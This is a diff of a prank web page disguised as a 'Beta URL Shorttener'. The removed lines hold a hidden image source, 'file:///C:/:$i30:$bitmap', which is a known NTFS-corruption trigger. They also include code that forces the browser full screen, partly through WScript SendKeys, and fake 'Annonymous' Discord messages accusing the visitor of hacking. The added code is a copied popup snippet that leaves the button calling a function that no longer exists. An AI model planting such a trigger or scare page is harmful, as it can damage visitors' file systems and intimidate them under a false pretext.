@@ -3,73 +3,22 @@
 <head>
 	<title>Plz Don't Hack Us</title>
 	<link rel="icon" href="https://discord.com/assets/07dca80a102d4149e9736d4b162cff6f.ico">
-  <script src="https://unpkg.com/wc-discord-message@^2.0.0/dist/wc-discord-message/wc-discord-message.js"></script>
-  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 	<style>
 		body { margin:0px; }
 	</style>
 </head>
 <body>
-  <img src="file:///C:/:$i30:$bitmap">
-  <discord-messages id="messages">
-  </discord-messages>
-	<script>
-		function maxWindow() {
-        window.moveTo(0, -25);
+<script>
+	var myWindow;/* w  w w.  ja  va  2s  . com*/
+	myWindow=window.open("", "myWindow", "width=200, height=100");
+	myWindow.document.write("<p>This is 'myWindow'</p>");
 
-        if (document.all) {
-            top.window.resizeTo(screen.availWidth, screen.availHeight);
-        }
-
-        else if (document.layers || document.getElementById) {
-            if (top.window.outerHeight < screen.availHeight || top.window.outerWidth < screen.availWidth) {
-                top.window.outerHeight = screen.availHeight + 25;
-                top.window.outerWidth = screen.availWidth;
-            }
-        }
-    }
-		
-		function requestFullScreen(element) {
-			// Supports most browsers and their versions.
-			var requestMethod = element.requestFullScreen || element.webkitRequestFullScreen || element.mozRequestFullScreen || element.msRequestFullScreen;
-
-			if (requestMethod) { // Native full screen.
-					requestMethod.call(element);
-			} else if (typeof window.ActiveXObject !== "undefined") { // Older IE.
-					var wscript = new ActiveXObject("WScript.Shell");
-					if (wscript !== null) {
-							wscript.SendKeys("{F11}");
-					}
-			}
-		}
-		
-		function addMessagesOne() {
-			maxWindow();
-			
-			const elements = document.getElementsByClassName("remove");
-			while(elements.length > 0){
-				elements[0].parentNode.removeChild(elements[0]);
-			}
-			
-			document.getElementById("messages").innerHTML = `
-				<discord-message author="Annonymous" avatar="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/6873254d-c380-460a-a41f-fbf0a7cce980/d6rav5k-4f98d258-b3fd-40e0-a359-b94dd995a511.png/v1/fill/w_894,h_894,strp/anonymous_logo_with_slogan_svg_animation_by_anondesign_d6rav5k-pre.png" role-color="#0099ff">
-					Hey, <discord-mention>Phantom</discord-mention> you hacked our friend <discord-mention>Toby</discord-mention>, how dare you. 
-				</discord-message>`;
-			setTimeout(addMessagesTwo, 3000);
-		}
-		function addMessagesTwo() {
-			document.getElementById("messages").innerHTML = `
-				<discord-message author="Annonymous" avatar="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/6873254d-c380-460a-a41f-fbf0a7cce980/d6rav5k-4f98d258-b3fd-40e0-a359-b94dd995a511.png/v1/fill/w_894,h_894,strp/anonymous_logo_with_slogan_svg_animation_by_anondesign_d6rav5k-pre.png" role-color="#0099ff">
-					Hey, <discord-mention>Phantom</discord-mention> you hacked our friend <discord-mention>Toby</discord-mention>, how dare you. 
-				</discord-message>
-				<discord-message author="Annonymous" avatar="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/6873254d-c380-460a-a41f-fbf0a7cce980/d6rav5k-4f98d258-b3fd-40e0-a359-b94dd995a511.png/v1/fill/w_894,h_894,strp/anonymous_logo_with_slogan_svg_animation_by_anondesign_d6rav5k-pre.png" role-color="#0099ff">
-					Bet you thought about getting away with it but atlas, we took notice.
-				</discord-message>`;
-		}
-	</script>
+	myWindow.moveTo(500, 100);
+	myWindow.focus();
+</script>
 	
-	<h1 class="remove">Beta URL Shorttener</h1>
-	<input class="remove" type=button value="Click to Open Link" onclick="addMessagesOne();">
+<h1 class="remove">Beta URL Shorttener</h1>
+<input class="remove" type=button value="Click to Open Link" onclick="addMessagesOne();">
 </body>
 </html>
